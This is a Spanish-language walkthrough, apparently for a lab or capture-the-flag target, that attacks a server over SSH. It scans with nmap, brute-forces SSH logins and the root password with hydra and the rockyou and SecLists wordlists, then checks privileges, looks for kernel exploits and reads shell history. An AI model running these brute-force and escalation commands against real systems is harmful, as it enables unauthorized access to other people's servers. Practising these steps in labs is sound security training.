++ Ubicar archivo de worldlist en /usr/share/worldlist
++ Copiar dicho archivo al escritorio y extraerlo
++ nmap <ip_server> 
++ Aparece el puerto 22 (ssh) abierto
++ Instalar seclists: sudo apt install seclists ó hacer uso del siguiente archivo: https://github.com/danielmiessler/SecLists
---- Enlace directo: wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && unzip SecList.zip && rm -f SecList.zip
++ hydra -L names.txt -P rockyou.txt ssh://<ip_servidor> 
--- Nota: La L mayúscula significa que no se conoce el usuario y se usará el archivo names.txt para intentar encontrarlo
++ hydra -l <nombre_usuario> -P rockyou.txt ssh://<ip_servidor>
--- Nota: La l minúscula significa que se conoce el usuario
++ Aparecerán las credenciales asociadas al servidor 
++ ssh <usuario>@<ip_servidor>
++ Ingresar contraseña encontrada
++ Ya se tiene acceso al servidor, comprobar con los siguientes comandos:
--- whoami
--- groups
++ uname -r (Nos muestra información sobre la versión de linux)
++ uname -a (Nos muestra información más detallada sobre el sistema)
++ Abrir otra terminal, procederemos a tratar de encontrar un exploit vinculado a la version de linux
++ sudo apt install linux-exploit-suggester
++ cd /usr/share/linux-exploit-suggester
++ ./linux-exploit-suggester.sh -k <version_kernel>
++ En esta ocasión no nos aparecen exploits, probaremos con otro método
++ Volvemos a la terminal con la sesion ssh abierta
++ cat .ash_history (Nos permite ver el historial de comandos ejecutados)
++ No nos aparece información útil, trataremos con otro método
++ hydra -l root -P rockyou.txt ssh://<ip_servidor> (Ataque de fuerza bruta para intentar descubrir la contraseña de root)


